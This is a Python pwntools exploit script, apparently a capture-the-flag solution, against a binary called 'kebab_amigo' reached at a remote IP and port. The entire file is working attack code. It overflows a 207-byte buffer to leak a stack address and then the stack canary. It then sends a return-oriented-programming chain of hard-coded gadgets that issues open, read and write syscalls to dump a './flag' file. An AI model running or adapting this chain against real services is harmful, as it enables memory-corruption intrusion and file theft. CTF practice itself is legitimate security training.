from pwn import *

#io = process("../src/kebab_amigo")
io = remote("217.76.52.139", 9990)
elf = ELF("../src/kebab_amigo")
context.log_level = "DEBUG"
#gdb.attach(io)

payload = b"A"*207
payload += p64(elf.symbols._)
io.sendline(payload)
stack_leak = u64(io.recv(6).ljust(8,b"\x00"))
io.recv(1) # recv \n
print("stack: "+hex(stack_leak))
canary_addr = stack_leak+249 # 248 hasta canario +1 para pasar el \00

payload = b"A"*207
payload += p64(canary_addr)
io.sendline(payload)
#io.interactive()

canary = u64(io.recv(7).rjust(8,b"\x00"))
print("canary: "+hex(canary))
io.recv()

syscall_ret = 0x0000000000422836
poprax_ret = 0x00000000004810ab
poprdi_ret = 0x0000000000403963
poprsi_ret = 0x00000000004024d8
poprdx_ret = 0x000000000040ecbe

payload = b"./flag\x00"
payload += b"A"*(207-len(payload))
payload += p64(stack_leak)
payload += b"A"*8
payload += p64(canary)
payload += b"A"*8
payload += p64(poprax_ret)
payload += p64(2)
payload += p64(poprdi_ret)
payload += p64(stack_leak+25)
payload += p64(poprsi_ret)
payload += p64(0)
payload += p64(poprdx_ret)
payload += p64(0)
payload += p64(syscall_ret) #open(flag)
payload += p64(poprax_ret)
payload += p64(0)
payload += p64(poprdi_ret)
payload += p64(3)
payload += p64(poprsi_ret)
payload += p64(stack_leak)
payload += p64(poprdx_ret)
payload += p64(100)
payload += p64(syscall_ret) #read
payload += p64(poprax_ret)
payload += p64(1)
payload += p64(poprdi_ret)
payload += p64(1)
payload += p64(poprsi_ret)
payload += p64(stack_leak)
payload += p64(poprdx_ret)
payload += p64(100)
payload += p64(syscall_ret) #write
io.sendline(payload)
io.interactive()
